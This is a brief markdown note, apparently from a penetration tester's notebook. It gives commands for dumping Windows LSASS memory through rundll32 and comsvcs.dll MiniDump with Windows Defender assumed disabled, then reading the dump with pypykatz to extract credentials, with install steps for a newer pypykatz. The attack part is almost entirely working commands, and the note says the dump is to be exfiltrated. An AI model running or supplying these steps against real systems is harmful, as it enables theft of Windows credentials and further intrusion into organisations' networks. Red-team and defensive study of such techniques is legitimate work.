
>[!info]
>This note is still in development.


```powershell
# Requires a neutered Windows Defender
$Process = (Get-Process -Name "lsass").Id
$OutFile = "C:/Windows/Temp/rundll"

# Dump LSASS via the "comsvcs.dll"
C:\Windows\system32\rundll32.exe C:\Windows\system32\comsvcs.dll MiniDump $Process $OutFile full
```

- Next you'll have to have exfil the dump file and read it with ``pypykatz``
	- Currently, the Kali version of ``pypykatz`` is version 0.6.6 which does not support Windows 11 dumps.  To fix this, we need to update to the latest version (0.6.8).

```shell
# Manual Pypykatz Installation
pip3 install minidump minikerberos asn1crypto
git clone https://github.com/skelsec/pypykatz
cd pypykatz
sudo python3 setup.py install

# Validate pypykatz version was updated
pypykatz version
```

Once ``pypykatz`` is updated, we can read the lsass dump.
```shell
pypykatz lsa minidump rundll > lsass_output.txt
```
